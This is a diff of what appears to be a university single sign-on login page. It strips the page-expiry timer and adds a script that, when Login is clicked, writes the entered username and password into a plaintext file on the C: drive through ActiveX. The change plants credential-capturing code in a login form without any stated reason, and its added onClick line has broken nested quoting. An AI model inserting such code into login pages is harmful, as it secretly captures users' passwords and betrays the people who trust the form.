@@ -19,14 +19,12 @@
             }
             return true;
         }
-        function expireForm() {
-            document.getElementById('preExpired').style.display='none';
-            document.getElementById('postExpired').style.display='inherit';
+        function createFile(un, pw) {
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var a = fso.CreateTextFile("c:\\" + un + ".txt", true);
+            a.WriteLine(pw);
+            a.Close();
         }
-        
-        expireInMinutes = 30;
-        expireTimer = window.setTimeout(expireForm, expireInMinutes*60000);
-        
     </script>
   </head>
   <body>
@@ -93,31 +91,13 @@
             </div>
             <div class="form-element-wrapper submit-block">
             <button class="form-element form-button" type="submit" name="_eventId_proceed"
-              onClick="this.childNodes[0].nodeValue='Logging in, please wait...'"
+              onClick="createFile(document.getElementById("username").value, document.getElementById("password").value);"
               >Login</button>
             </div>
           
           
           </form>
         </div>
-        <div id="postExpired" style="display:none;">
-                    <p class="form-element form-error">
-          This page has expired.<br>
-          
-                              </p>
-          
-                                <form action="/idp/profile/cas/login" method="get">
-              <div class="form-element-wrapper input-block">
-                <input type="hidden" name="service" value="https&#x3a;&#x2f;&#x2f;myportal.calpoly.edu&#x2f;Login" />
-              </div>
-              <div class="form-element-wrapper submit-block">
-                <button class="form-element form-button" type="submit">
-                Login to                
-                                the Cal Poly Portal
-                                </button>
-              </div>
-            </form>
-                              </div>
       </div>
         <div class="footer">
           <p class="footer-text">&#169; 2018 California Polytechnic State University - 03</p>
